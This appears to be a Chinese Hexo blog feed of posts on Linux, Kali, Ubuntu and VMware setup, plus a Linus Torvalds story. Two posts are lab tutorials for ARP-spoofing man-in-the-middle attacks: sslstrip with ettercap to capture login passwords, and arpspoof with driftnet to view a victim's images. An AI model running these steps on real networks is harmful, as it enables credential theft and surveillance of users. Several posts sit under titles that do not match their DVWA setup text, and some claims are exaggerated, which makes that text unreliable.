操作系统让李纳斯很是无奈，因为这套系统甚至无法利用386芯片极大提升的性能。曾经沧海难为水，享受过UNIX的美好，叫他如何还能容忍DOS的low？他打心眼里想给这台电脑装UNIX，但不幸的是（却是世界之幸），UNIX太贵了，他完全负担不起！当时MINIX软件，作为UNIX的一个小型克隆也很受人们的追捧，而且价格比UNIX要低很多，他便退而求其次，购买了MINIX软件。而正是他的这一举动，最终促成了Linux后来的诞生！MINIX软件从订购到拿到手李纳斯用了一个月的时间，但那时的他却感觉如同过了六年一般漫长，他花了大量时间去仔细了解它的功能和用途，最后他成功了解了它好的方面，却在同时也了解了它不好的方面。但最让他不能接受的是，MINIX的终端仿真做得太糟糕了。要知道那时的他只有依赖终端仿真，才能让家里的电脑模仿大学的电脑，从而享受UNIX的强大与稳定。这样的缺陷对他而言简直就是致命的！在饱受一番折磨之后，他痛定思痛，最终决定：自己做一个终端仿真！ ##Linux 诞生！这是李纳斯人生中的第一台PC，要做终端仿真，他需要学习很多东西。他从 BIOS 开始学习，了解 CPU 的工作原理，了解怎样写入显示器、怎样读键盘输入、怎样读写调制解调器……后来他想出两条独立的线程：一条线程从调制解调器读出，然后在显示器上显示；另一条线程从键盘上读出，然后写入调制解调器。他写的最早的试验程序是使用一个线程将字母 A 写到显示器上，另一个线程写B。最后他就能改变由一连串 A 和一连串 B 组成的两个线程，使数据一个读自调制解调器，再写入显示器，另一个读自键盘，再写入调制解调器。到这时，他的终端仿真程序正式宣告制作成功！成功之后的那种发自内心的喜悦自然难以言喻。凭借自己的终端仿真器，他经常登录学校的电脑上，查阅电子邮件和参加 MINIX 讨论组。但是好景不长，他很快又发现了一个新问题，那就是：他无法下载和上传东西！也就是说，他必须能够向磁盘里保存东西。若要实现这个功能，他的终端仿真器必须装个磁盘驱动，外加一个文件系统驱动！这个时候，即便李纳斯极度渴望这个功能，也未免有些泄气了，因为做这些实在是太麻烦了！也不值得。只是没过多久他就改变了主意，因为他发现：除此之外他没有什么可做的！大学课程非常简单，无需费太多的心思，同学聚会也让他提不起精神，而搞驱动程序的工作虽然很麻烦，但却很有意思！于是，他开始了写磁盘驱动程序的艰苦生涯。每天睁开眼睛后第一件事——编程，饿了就嚼饼干，嚼完继续编程，困了就睡会儿，醒来继续编程，洗澡也就冲冲了事，冲完澡继续编程……没了白天和夜晚，分不清周末还是工作日，电脑之外的世界几乎与他绝缘，在这场马拉松式的编程中，某一天他突然意识到：这项工作已经不再是优化一个终端仿真器，而是再造一个操作系统！Linux 操作系统就是这样开始的，而他的试验程序则变成了终端仿真组合程序。又经过数个月的努力之后，外壳程序开发完成，这个时候的他感觉便如创世之时的上帝，只待说出“要有光”一样执掌一切。当他把外壳程序移到一个他为新的操作系统所建的特别区域中后，一个新的操作系统宣告了诞生！他将其命名为“Linux”！然后，他毫不犹豫地就将Linux发布出去了，因为他一直有与人交流程序的习惯。在那时的PC世界中，有一个有关软件共享的传统，就是你下载了一个程序，就应该给作者寄回十块钱左右的回报。但李纳斯并不想要钱，他只想要明信片，因为与钱相比，他更想知道都有哪儿的人在使用 Linux，结果他收到了逾百万张明信片。而他当初买电脑时的欠款则在一个朋友的帮助下，成功地从一项网上募捐行动中得到了解决……为嘛这事儿听起来这么有喜感？但是这时候的Linux并未脱离MINIX而存在，似乎上帝对这样的结果仍不满意，便推了他一把：他在接下来的某一天出现操作失误，将MINIX分区破坏了！这个时候他可以选择重装MINIX，也可以通过完善Linux来彻底取代MINIX。他选择了后者，因为他觉得Linux已经足够好。于是，从这时起，人们开始用Linux来做些事了。因为开源的缘故，Linux 的用户开始与日俱增，获得了巨大的发展，世界各地的程序员们每天都在共同分享彼此提出的修改建议。从1991年开始至今，Linux内核由10239行代码增加到了近1千万行代码，其中只有2%出自李纳斯之手。而且每天仍会新增约4752行代码，且有1671行代码会做出变更。李纳斯喜欢有这么多的人给他从事这个事业的动力，他曾认为自己已接近于完成它了，但却始终没有真正做到这一点。人们一直给李纳斯更多继续的理由，以及更多困扰的棘手难题，这使得继续完善 Linux 变得更为有趣。否则，他可能早就干别的事情去了。这并非耸人听闻的言论，而是李纳斯亲口所说。生活的终极目标是快乐李纳斯并不是离不开电脑，也不是离不开Linux。早年上高中的时候，就因为感到有些课程比较有趣，比方说影响经济的因素，季风及季风成因等，可以让他放下了电脑去啃书本。在与现任妻子塔芙同居的最初两周，他甚至都没有动过一下电脑，但他也并不为离开电脑而感到难受。大学时期服兵役一年，离开电脑一年之久，他也没有对其有任何想念。他曾花了数小时为他的宝马Z3选择合适的颜色而苦思冥想。原因无他，仅仅是觉得有意思而已。在他看来，生活的进化过程主要分为三个阶段：生存、社会秩序和娱乐，而娱乐是生活的最高形式。他说，“你可以为事业而奋斗，然而最终，生活的终极目标是快乐。”编程是他的乐趣，写出Linux也是乐趣使然。在无数次追求快乐而不得的纠结与无奈过后，Linux才得以成功面世。他无心做出一个举世瞩目的产品，也无意打造自己的商业帝国。微软把Linux视为Windows操作系统最大的竞争对手，而Linux的拥趸则无时不刻不在网上发言声称：Linux终将取代Windows。但他却丝毫不为此挂心，每天在自己的卧房里（很难想象那里就是举世瞩目的Linux全球总部）做着自己感兴趣的事——为Linux编程。]]></content>
      <categories>
        <category>活在传说中的大佬</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Ubuntu安装kali工具集katoolin]]></title>
    <url>%2F2018%2F02%2F27%2FUbuntu%E5%AE%89%E8%A3%85kali%E5%B7%A5%E5%85%B7%E9%9B%86katoolin%2F</url>
    <content type="text"><![CDATA[katoolin其实算是个kali懒人工具集了吧，其中集成了很多实用的工具，可以让你把你的Ubuntu定制成一个渗透工具。这是托管到GitHub仓库的项目地址:https://github.com/LionSec/katoolin下面开始安装。由于这个工具是需要python的环境的，所以首先确保你的python环境为2.7。Ubuntu已经包含了python2.7和python3.5的环境了。安装git，因为需要从GitHub仓库clone下来。切换到root用户。1lengyue@ubuntu:~$ sudo su 从GitHub上clone到本地并且创建目录复制进去。添加权限。1root@ubuntu:/home/lengyue# chmod +x /usr/bin/katoolin 现在可以打开katoolin了。katoolin操作说明:[W] Before updating your system , please remove all Kali-linux repositories to avoid any kind of problem .这句话的意思是:[警告]更新你的操作系统前，请删除所有kali—Linux的软件仓库以避免一些问题。1.添加软件源并且更新2.查看分类3.安装基本菜单4.安装kali菜单5.帮助这里是本工具的作者及其网站，本工具集成了331个工具下面我来做个简单的示范，简单的使用一下，更多操作姿势大家可以自己摸索。简单的使用:先输入2.它会提示你:选择一个类型或者按下0去安装所有的kali Linux工具。其实这个时候最好不要按0安装全部的软件，因为这么多工具你根本是不可能全部用得到的，你仅仅可以把你最喜欢最会用的工具安装一下就可以了。你也可以在渗透的过程中如果需要什么工具，你再来安装即可。安装太多的工具，你的Ubuntu系统一定会崩溃的，到时候会变得特别卡。它上面有分类，针对不同的环境有不同的工具分类。特别人性化。下面我实例安装一个我最喜欢的sqlmap和w3af。哦对了，说一句，这上面有些工具kali已经不再有了，有些是属于backtrack时期才有的工具。如果你有哪些工具在kali上找不到，这个工具集里有可能有。比如这个w3af，是在BT5 r3中才有的。kali已经取消了它。其实我最喜欢这个了。而且你在kali上如果安装w3af，你会发现会需要各种依赖，python模块，有些依赖模块如果安装了，又会与当前环境冲突，由此可见这个工具集其实还是相当实用的。可以省去你很大的麻烦来处理各种依赖关系。我们按下4，找到适用于web攻击的工具，然后按33安装w3af。它会自动安装，稍等就可以了，你不需要格外的做任何事。(当然喝杯咖啡是可以的)安装后我们打开w3af。下面安装sqlmap。按下27进行安装。安装后启动，。好了，katoolin的基本操作方式就是这些，以后我再来讲解这些工具的使用。]]></content>
      <categories>
        <category>ubuntu</category>
      </categories>
      <tags>
        <tag>Kali</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Kali安装后出现的一些情况]]></title>
    <url>%2F2018%2F02%2F26%2FKali%E5%AE%89%E8%A3%85%E5%90%8E%E5%87%BA%E7%8E%B0%E7%9A%84%E4%B8%80%E4%BA%9B%E6%83%85%E5%86%B5%2F</url>
    <content type="text"><![CDATA[1.Metasploit无法启动，通常会显示如下画面有人说是因为Metasploit依赖postgresql数据库，这话说的完全没毛病。但是你可以试试打开这个数据库，再来看看是否可以启动。输入如图所示的命令，再来打开看看怎么样。其实还是不能正常启动的。因为并不是数据库的问题，，当你在打开Metasploit的时候，后台是会自动启动postgresql数据库服务的。这是因为内存的原因。你关闭虚拟机，在设置里再为你的kali多分配一点内存就可以了。虚拟机安装的时候会默认分配512M的，但是并不够kali正常的运行程序。其实如果你的宿主机的内存足够大的话，你可以多分配一点，比如4g。如果内存不是很大的话，你可以分配2g。然后就可以正常运行Metasploit了。2.fork失败无法分配内存。会出现某程序无法打开，或者就是打开了，也会立马退出，这也是内存分配太小的情况。你可以试着分配更大的内存，就可以完美解决了，再也不会出现这种情况了。而且内存变大后，你会发现你的kali变得很丝滑，再也不会卡顿了。3.kali在运行的时候经常会出现运行的程序崩溃，突然自动退出或者干脆不动，卡在那里一动不动，加大内存后就可以了。VMware默认给kali分配的内存只有512M，在2016版本中还勉强可以，在新的2017和2018中就已经不行了，当然你如果安装的不是图形化界面，而是指令化界面，则不用分配太多的内存，因为你不用分配更多的内存给图形化桌面了。]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>Kali</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Ubuntu默认进入客人会话模式问题解决]]></title>
    <url>%2F2018%2F02%2F26%2FUbuntu%E9%BB%98%E8%AE%A4%E8%BF%9B%E5%85%A5%E5%AE%A2%E4%BA%BA%E4%BC%9A%E8%AF%9D%E6%A8%A1%E5%BC%8F%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%2F</url>
    <content type="text"><![CDATA[在打开Ubuntu的时候，我们点击登陆的那个按钮的时候，会突然进入到客人会话模式，而且无法从客人会话模式回到主账户登录页面。PS：客人会话模式是不需要登陆密码直接进入系统的模式，但是这个时候的系统是没经过更改最原始的状态，我们在这个模式下是看不到你用其他账户修改的文件的。而且权限很小，不能更改文件，基本上只有读 的权限，而没有写的权限。我们要是想进入登陆界面，就需要禁止这个客人会话的模式。我们需要ctr+alt+F1，进入tty（虚拟控制台），然后再登陆自己的账户。我们已经成功登陆到自己的账户中。 然后执行命令：1cd /usr/share/lightdm/lightdm.conf.d/ 执行一下ls命令。 接着执行命令1sudo vim 50-guest-warepper.conf 打开这个文件后，我们可以看到如图所示： 按i进入插入模式，进行编辑。输入如下内容。 allow-guest=false[SeatDefaults] 然后按Esc，按shift的同时按一下：，然后输入wq，进行保存退出。然后输入命令reboot，重启系统。当我们再次进入系统的时候，就会直接看到登陆界面了。此时，会话模式已经被禁止了。当然如果你需要会话模式的话，你可以把这个配置文件删除就可以了。命令为：1sudo rm /usr/share/lightdm/lightdm.conf.d/50-guest-wrapper.conf。 Tips：会话模式可以在无关人员进入你系统的时候很好的保护你的隐私以及系统，但是如果这台系统只有你个人或者其他有关人员使用的话，禁用是可以的。]]></content>
      <categories>
        <category>ubuntu</category>
      </categories>
      <tags>
        <tag>Ubuntu</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Ubuntu安装gnome桌面]]></title>
    <url>%2F2018%2F02%2F25%2FUbuntu%E5%AE%89%E8%A3%85gnome%E6%A1%8C%E9%9D%A2%2F</url>
    <content type="text"><![CDATA[1.首先下载DVWA包，网站：http://www.dvwa.co.uk/。2.然后下载xampp，网站：https://www.apachefriends.org/zh_cn/index.html3.首先我们进入下载xampp和DVWA的文件目录，安装xampp，我们可以看到xampp并不是常见的.deb,.rpm的软件包，而是.run的源码包。 4.对文件添加权限，不然是不能运行安装的。 5.然后运行源码包进行安装xampp，运行后会出现一个安装界面。 6.点击next，继续。 7.然后我们可以看到提示：xampp将会安装大盘/opt/lampp目录下，我们需要记住这个目录，方便我们安装DVWA和管理调试xampp。 8.安装已经开始了。 9.安装完成。 10.我们可以打开浏览器测试一下是否安装成功。 11.然后我们开始解压DVWA。 12.我们现在进入xampp的安装目录。 13.把解压的DVWA文件复制进 htdocs/文件夹内。 14.然后我们需要修改一下DVWA的配置文件。注意:一定要留空，不然不能创建数据库。 15.在浏览器打开DVWA。提示我们把config.inc.php.dist复制到config.inc.php。 16.其实我们把config.inc.php.dist移动到config.inc.php就可以了，.dist是不能被浏览器打开的，需要是.php的文件。 17.刷新一下浏览器。ok，出来了。 18.这是登陆界面。 19.Tips:默认账号：admin，密码：password。以后使用DVWA的时候需要先启用xampp，输入以下命令就可以打开了。1$ sudo /opt/lampp/lampp start]]></content>
      <categories>
        <category>ubuntu</category>
      </categories>
      <tags>
        <tag>Ubuntu</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Ubuntu安装中文man手册]]></title>
    <url>%2F2018%2F02%2F25%2FUbuntu%E5%AE%89%E8%A3%85%E4%B8%AD%E6%96%87man%E6%89%8B%E5%86%8C%2F</url>
    <content type="text"><![CDATA[1.首先下载DVWA包，网站：http://www.dvwa.co.uk/。2.然后下载xampp，网站：https://www.apachefriends.org/zh_cn/index.html3.首先我们进入下载xampp和DVWA的文件目录，安装xampp，我们可以看到xampp并不是常见的.deb,.rpm的软件包，而是.run的源码包。 4.对文件添加权限，不然是不能运行安装的。 5.然后运行源码包进行安装xampp，运行后会出现一个安装界面。 6.点击next，继续。 7.然后我们可以看到提示：xampp将会安装大盘/opt/lampp目录下，我们需要记住这个目录，方便我们安装DVWA和管理调试xampp。 8.安装已经开始了。 9.安装完成。 10.我们可以打开浏览器测试一下是否安装成功。 11.然后我们开始解压DVWA。 12.我们现在进入xampp的安装目录。 13.把解压的DVWA文件复制进 htdocs/文件夹内。 14.然后我们需要修改一下DVWA的配置文件。注意:一定要留空，不然不能创建数据库。 15.在浏览器打开DVWA。提示我们把config.inc.php.dist复制到config.inc.php。 16.其实我们把config.inc.php.dist移动到config.inc.php就可以了，.dist是不能被浏览器打开的，需要是.php的文件。 17.刷新一下浏览器。ok，出来了。 18.这是登陆界面。 19.Tips:默认账号：admin，密码：password。以后使用DVWA的时候需要先启用xampp，输入以下命令就可以打开了。1$ sudo /opt/lampp/lampp start]]></content>
      <categories>
        <category>ubuntu</category>
      </categories>
      <tags>
        <tag>Ubuntu</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Ubuntu安装wineQQ]]></title>
    <url>%2F2018%2F02%2F25%2FUbuntu%E5%AE%89%E8%A3%85wineQQ%2F</url>
    <content type="text"><![CDATA[1.首先下载DVWA包，网站：http://www.dvwa.co.uk/。2.然后下载xampp，网站：https://www.apachefriends.org/zh_cn/index.html3.首先我们进入下载xampp和DVWA的文件目录，安装xampp，我们可以看到xampp并不是常见的.deb,.rpm的软件包，而是.run的源码包。 4.对文件添加权限，不然是不能运行安装的。 5.然后运行源码包进行安装xampp，运行后会出现一个安装界面。 6.点击next，继续。 7.然后我们可以看到提示：xampp将会安装大盘/opt/lampp目录下，我们需要记住这个目录，方便我们安装DVWA和管理调试xampp。 8.安装已经开始了。 9.安装完成。 10.我们可以打开浏览器测试一下是否安装成功。 11.然后我们开始解压DVWA。 12.我们现在进入xampp的安装目录。 13.把解压的DVWA文件复制进 htdocs/文件夹内。 14.然后我们需要修改一下DVWA的配置文件。注意:一定要留空，不然不能创建数据库。 15.在浏览器打开DVWA。提示我们把config.inc.php.dist复制到config.inc.php。 16.其实我们把config.inc.php.dist移动到config.inc.php就可以了，.dist是不能被浏览器打开的，需要是.php的文件。 17.刷新一下浏览器。ok，出来了。 18.这是登陆界面。 19.Tips:默认账号：admin，密码：password。以后使用DVWA的时候需要先启用xampp，输入以下命令就可以打开了。1$ sudo /opt/lampp/lampp start]]></content>
      <categories>
        <category>ubuntu</category>
      </categories>
      <tags>
        <tag>Ubuntu</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Ubuntu搭建DVWA靶机环境]]></title>
    <url>%2F2018%2F02%2F25%2FUbuntu%E6%90%AD%E5%BB%BADVWA%E9%9D%B6%E6%9C%BA%E7%8E%AF%E5%A2%83%2F</url>
    <content type="text"><![CDATA[1.首先下载DVWA包，网站：http://www.dvwa.co.uk/2.然后下载xampp，网站：https://www.apachefriends.org/zh_cn/index.html3.首先我们进入下载xampp和DVWA的文件目录，安装xampp，我们可以看到xampp并不是常见的.deb,.rpm的软件包，而是.run的源码包。 4.对文件添加权限，不然是不能运行安装的。 5.然后运行源码包进行安装xampp，运行后会出现一个安装界面。 6.点击next，继续。 7.然后我们可以看到提示：xampp将会安装大盘/opt/lampp目录下，我们需要记住这个目录，方便我们安装DVWA和管理调试xampp。 8.安装已经开始了。 9.安装完成。 10.我们可以打开浏览器测试一下是否安装成功。 11.然后我们开始解压DVWA。 12.我们现在进入xampp的安装目录。 13.把解压的DVWA文件复制进 htdocs/文件夹内。 14.然后我们需要修改一下DVWA的配置文件。注意:一定要留空，不然不能创建数据库。 15.在浏览器打开DVWA。提示我们把config.inc.php.dist复制到config.inc.php。 16.其实我们把config.inc.php.dist移动到config.inc.php就可以了，.dist是不能被浏览器打开的，需要是.php的文件。 17.刷新一下浏览器。ok，出来了。 18.这是登陆界面。 19.Tips:默认账号：admin，密码：password。以后使用DVWA的时候需要先启用xampp，输入以下命令就可以打开了。1$ sudo /opt/lampp/lampp start 扫码进群，我等待你的加入]]></content>
      <categories>
        <category>ubuntu</category>
      </categories>
      <tags>
        <tag>Ubuntu</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Windows上安装Ubuntu子系统]]></title>
    <url>%2F2018%2F02%2F24%2FWindows%E4%B8%8A%E5%AE%89%E8%A3%85Ubuntu%E5%AD%90%E7%B3%BB%E7%BB%9F%2F</url>
    <content type="text"><![CDATA[教程开始我们直接去windows商店搜索Ubuntu即可。目前windows只支持Ubuntu和SUSE。很遗憾的是Debian和Redhat还没有。这是它支持的环境。(在你安装的时候它会自动检测环境，如果不符合则不会进行安装)。 然后我们直接进行安装就可以了，很简单很简单。但是当你安装完成后，还是不能启动Ubuntu的。(请确保你的网络环境良好，这个软件有点大)你还需要启用windows子系统的Linux特征。方法1:转至“开始”菜单搜索和PowerShell。以管理员身份运行它：1Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Windows-Subsystem-Linux 会要求您确认选择。使用Y或按Enter键：现在你应该要求重新启动。即使你没有被要求，也必须重新启动系统。这将需要一些时间去安装和你的用户名和密码。 Using Bash on Windows 10Save 别担心，它只是用于第一次运行。Bashshell将直接从下次起。 享受LinuxWindows10内部。方法2:依次打开设置——更新和安全——针对开发人员——开发人员模式，选择是，进入控制面板的程序，启用或关闭Windows功能，勾选Windows Subsystem for Linux(Beta)。确认即可。 安装完毕后，我们需要设置一下用户名和登陆密码。故障1：WSL的可选部件未被启用。请先启用后重试。你可以看到像这样的错误当你运行LinuxWindows10内部：1234The WSL optional component is not enabled. Please enable it and try again.See https://aka.ms/wslinstall for details.Error: 0x8007007ePress any key to continue... 当您按下任何键，该应用被立即关闭。 在这里，原因是WindowsLinuxsubsyetm未启用。你应该使它在如步骤1。你可以这样做，即使在安装了Linux与Windows应用商店。建议阅读如何恢复删除的文件在Linux&bra;新手指南&ket; 故障2：安装失败，错误代码0x80070003这是因为Windows子系统用于仅运行在Linux系统驱动即C盘。你要确保当你从Windows应用商店下载Linux，它是存储与安装在C驱动器中。依次打开设置——系统 ——存储——更多存储位置——更改新内容的保存位置，设置为新的应用将保存到 此电脑(c).]]></content>
      <categories>
        <category>ubuntu</category>
      </categories>
      <tags>
        <tag>Ubuntu</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[VMware虚拟机设置桥接模式]]></title>
    <url>%2F2018%2F02%2F24%2FVMware%E8%99%9A%E6%8B%9F%E6%9C%BA%E8%AE%BE%E7%BD%AE%E6%A1%A5%E6%8E%A5%E6%A8%A1%E5%BC%8F%2F</url>
    <content type="text"><![CDATA[教程开始我们在安装完虚拟机的时候是不会有桥接模式的。打开虚拟机编辑→虚拟网络编辑器，可以查看到。如图 依次打开控制面板——网络和Internet——网络连接，可以看到网络适配器，如图网络类型 网络适配器名Bridged VMnet0NAT VMnet8Host-only VMnet1 还有一点要说的是，其实桥接并不是要添加VMnet0虚拟网卡，而是添加net bridge网络服务。好了，不罗嗦了，下面真正开始的安装桥接的网络服务。依次打开控制面板——网络和Internet——网络连接，右击WLAN(无限局域网)。然后依次打开属性——网络——安装——服务——添加——从磁盘安装——浏览。然后找到你安装VMware的文件所在位置，选择netbridge.inf文件，点击确定。出现“选择网络服务”窗口，选择网络服务“VMware Bridge Protocol”再次确定之后，确认该网络服务是选中状态。重启系统使之生效，然后你可以在虚拟机里选择桥接模式了，你可以查看一下网关地址，是否和你主机的相同，来验证是否已经使用了桥接模式。而且你可以ping一下主机，是完全可以ping通的。]]></content>
      <categories>
        <category>虚拟机</category>
      </categories>
      <tags>
        <tag>VMware</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Ubuntu安装网易云音乐]]></title>
    <url>%2F2018%2F02%2F23%2FUbuntu%E5%AE%89%E8%A3%85%E7%BD%91%E6%98%93%E4%BA%91%E9%9F%B3%E4%B9%90%2F</url>
    <content type="text"><![CDATA[教程开始首先去网易云的官网下载Linux版的网易云的.deb的软件包.点此进行下载，选择Ubuntu16.04.然后开始进行安装。 修复依赖关系。 好了，安装完成，现在可以打开网易云听歌了。Tips:提醒一些各位，在使用过程中可能感觉到卡顿，或者突然打不开，或者程序崩溃，都是因为网易云需要占用很大的内存，而你的Ubuntu如果内存很小的话，就会这样。你可以通过调整虚拟机给Ubuntu设置的内存，这样你的Ubuntu运行速度会得到很大的提升，运行会更加丝滑。]]></content>
      <categories>
        <category>ubuntu</category>
      </categories>
      <tags>
        <tag>Ubuntu</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用ssltrip突破ssl加密截获密码]]></title>
    <url>%2F2018%2F02%2F23%2F%E4%BD%BF%E7%94%A8ssltrip%E7%AA%81%E7%A0%B4ssl%E5%8A%A0%E5%AF%86%E6%88%AA%E8%8E%B7%E5%AF%86%E7%A0%81%2F</url>
    <content type="text"><![CDATA[2009年的黑帽大会上，一个名叫Moxie Marlinspike（作者博客：http://www.thoughtcrime.org/）的研究人员,发布了一个叫sslstrip的工具。通过该工具,可以实现对ssl进行中间人攻击。原理大概是这样的:ARP欺骗，是的攻击者能截获所有目标主机的网络流量。攻击者利用用户对于地址栏中HTTPS与HTTP的疏忽，将所有的HTTPS连接都用HTTP来代替。同时，与目标服务器建立正常的HTTPS连接。由于HTTP通信是没有经过加密传输的，并没有HTTPS安全，所以攻击者能轻松实施嗅探。解释一下本次教程使用到的SSL协议。SSL(Secure Sockets Layer 安全套接层)，及其继任者传输层安全（Transport Layer Security，TLS）是为网络通信提供安全及数据完整性的一种安全协议。TLS与SSL在传输层对网络连接进行加密。被用于web浏览器与服务器之间的身份认证和加密数据传输。保障了数据传输的安全，利用了数据加密确保数据在网络上的传输不会被截取以及窃听。我们这次就是利用了中间人攻击 软件下载网站，点此)进行下载。可以直接在此页面直接进行下载安装sslstrip最新版，也可以使用git clone进行下载。安装环境需要python版本&gt;=2.5。一般Linux上都已经预装了python环境。 解压。1root@kali:~# tar zxvf sslstrip-0.9.tar.gz 安装。12root@kali:~# cd sslstrip-0.9root@kali:~# python ./setup.py install 开启内核转发功能保证攻击过程中被攻击者不断网。1root@kali:~# echo 1 &gt; /proc/sys/net/ipv4/ip_forward 使用iptables把80端口的流量转发到sslstrip监听的8080端口上.注意啦!!!(敲黑板，划重点啦)我看到网上朋友有很多写这个教程的，命令基本上都是iptables -t nat -A PREROUTING -p tcp –destination-port 80 -j REDIRECT –to-port 。其实这个命令你运行后会报错，你输入iptables -h查看一下就知道哪里出错了。我实在不知道他们在哪找的这些命令参数。还有就是，你在用Linux命令时候，一定要提前输入-h，你不知道那个命令版本到底支持哪些参数，你也可以作为一个参考。其实真正的命令是这个:1root@kali:~# iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080 启动sslstrip。 sslstrip -l 8080 使用ettercap对目标主机进行arp攻击，并且开始嗅探密码。Tips: 在攻击过程不要关闭sslstrip的窗口。 本次实验环境：攻击者：kali Linux(2018.1.8),ip:192.168.1.131 ,网关:192.168.1.1被攻击者: windows7,ip:192.168.1.105,网关:192.168.1.1 我们使用ettercap的GTK+ GUI图像界面输入1root@kali:~# ettercap -G 打开后是这样。打开ettercap之后，选择Sniff—-Unified-sniffing，然后选择网卡：eth0(我这里是eth0，大家根据情况选择)。然后Hosts——Scan for hosts——Hosts list，此时找到我们的目标主机ip(192.168.1.105).选定目标主机，然后点add to target 1,将目标主机添加到目标1;选定路由，点add to target 2,将路由添加到目标2.添加成功后，点击Mitm——ARP posoning ，勾选sniff remote connections。之后start——start sniffing开始监听。点击view——connections查看被攻击机访问的IP，端口，协议，发送和接收的数据包大小。点击view——profiles查看被攻击机访问的链接。在下方可以查看更清晰的链接访问情况。当然你也可以通过双击链接来查看profiles details，即访问网站的具体情况。在这里，如果被攻击机输入密码登陆某一网站，我们可以检测到登陆的用户名及其密码。这是刚刚检测到的一个用户名和登陆密码。这个网站完全没有对密码进行加密操作，出来的结果也是明文显示的。这是另外一个站检测出来的，对密码进行了加密。实在对不起，网站的细节并不能展示出来，大家只要明白操作姿势就可以了。其实我为了测试设置的密码都只是123456，但是因为进行了加密，还是很难解密的出来。Tips：其实一个网站如果使用的都是https协议，那么安全性绝对做的很好，他们的数据都是进行了加密的，也就是说你即使已经把https降低为http，即使捕获到了密码，你也不可能轻易解密的出来。好了，ettercap已经截获到了密码，教程到此结束。]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>Kali</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[kali教程之内网劫持网页图片]]></title>
    <url>%2F2018%2F02%2F22%2Fkali%E6%95%99%E7%A8%8B%E4%B9%8B%E5%86%85%E7%BD%91%E5%8A%AB%E6%8C%81%E7%BD%91%E9%A1%B5%E5%9B%BE%E7%89%87%2F</url>
    <content type="text"><![CDATA[Tips:本人在虚拟机中进行操作，大家也可以在自己主机上进行操作。首先我在虚拟机里安装了一台win7的操作系统，作为被攻击人，一台kali Linux作为攻击人。WARNING:首先这2台运行在虚拟机里的操作系统是处于同一网关下的。（攻击人与被攻击人必须处于同一网关下才可以进行劫持） 我们首先查看一下win7的IP及其网关。win+R，输入cmd，打开dos窗口，输入ipconfig可以看到IP地址：192.168.253.130，网关地址：192.168.253.2。 打开kaliLinux，打开终端，输入route -n，查看一下kali的网关，也是192.168.253.2.说明这2台虚拟机的系统确实是在同一网段下的。TIps：这个操作只是为了给大家验证一下2个系统是否在同一网段下。 查看一下kali的网卡设备。输入ifconfig。 在终端中输入arpspoof -h，查看一下帮助。（只是为了查看一下命令参数而已） 然后输入命令：arpspoof -i eth0 -t 192.168.253.2 193.168.253.130，回车。解释：-i eth0(网卡设备），-t 192.168.253.2 192.168.253.130（攻击目标的网关地址和IP地址）。 Tips：网关地址和内网IP地址一起才可以唯一确定在本地局域网的一台主机。 然后再打开一个终端，输入drifnet -i eth0.会立刻弹出一个窗口 然后我们开始在win7中浏览网页，随意浏览就可以。以下是我在win7中浏览新闻显示的图片。这是我在win7登陆的QQ空间显示的照片。这时我在kali劫持到的图片好了，劫持成功。 下面做几点总结，方便各位操作，少走弯路。在进行劫持的时候，可能会使被攻击的主机暂时不能连上网以及打不开网页。本次操作是在同一虚拟机下的2台操作系统，你要是用虚拟机的kali来劫持宿主机，如果你虚拟机连接的是nat模式，那么宿主机与虚拟机并不在同一网关下，你在输入命令的时候会提示你couldn’t arp for host，这就是因为你的虚拟机与你的宿主机并不在同一网关下，所以不能进行arp欺骗。 如果你要用虚拟机里的kali来对你主机所处网段下的主机劫持的话，就需要把虚拟机网络设置为桥接模式，这样虚拟机的kali就与宿主机在同一网段了。如果目标开启了防火墙，而且安装了被攻击的主机安装了很多防护软件，软件会提示受到arp欺骗攻击，而且会对主机做出防护，那么你的劫持就不会成功。扫码进群，我等待你的加入]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>Kali</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hexo教程（1）——SEO优化]]></title>
    <url>%2F2018%2F02%2F21%2Fhexo%E6%95%99%E7%A8%8B_1_SEO%E4%BC%98%E5%8C%961%2F</url>
    <content type="text"><![CDATA[hexo教程之SEO的优化要百度谷歌收录你的站点SEO是由英文Search Engine Optimization缩写而来， 中文意译为“搜索引擎优化”。SEO是指通过站内优化比如网站结构调整、网站内容建设、网站代码优化等以及站外优化。 在站点搭建完成后，我们的站点是不能让各大搜索引擎搜索到的。因为这些搜索引擎并没有收录我们的网站，我们可以在搜索引擎中输入bash site:domain bash可以看到百度是没有进行收录的。这个时候呢，我们需要让百度收录我们的网站，我们点击提交网站，不过需要登陆一下你的百度账号才可以进行提交。建议输入的网站为www开头的，不要输入github.io的，因为github是不允许百度的spider爬取github上的内容的，所以如果想让你的站点被百度收录，只能使用自己购买的域名。首次提交，你需要完善账户信息，需要实名认证。我们再次提交网站。点击下一步继续。(请注意提示，请不要随意设置站点属性)。可以看到为我们提供了3种方式验证网站的所有权，但是我感觉CNAME比较简单，只需要添加一条解析就可以了。这里我就选CANME验证。这个需要你到买域名的地方，进入你的控制台，按照刚才百度上给的提示添加一条解析就可以了。如图，我已经解析成功了，其实解析还是挺快的。这样我们就完成了对百度的收录工作。提交完了，就只能慢慢的等待了，也许会很长时间才会生效。]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[kali2017.3安装vm-tools]]></title>
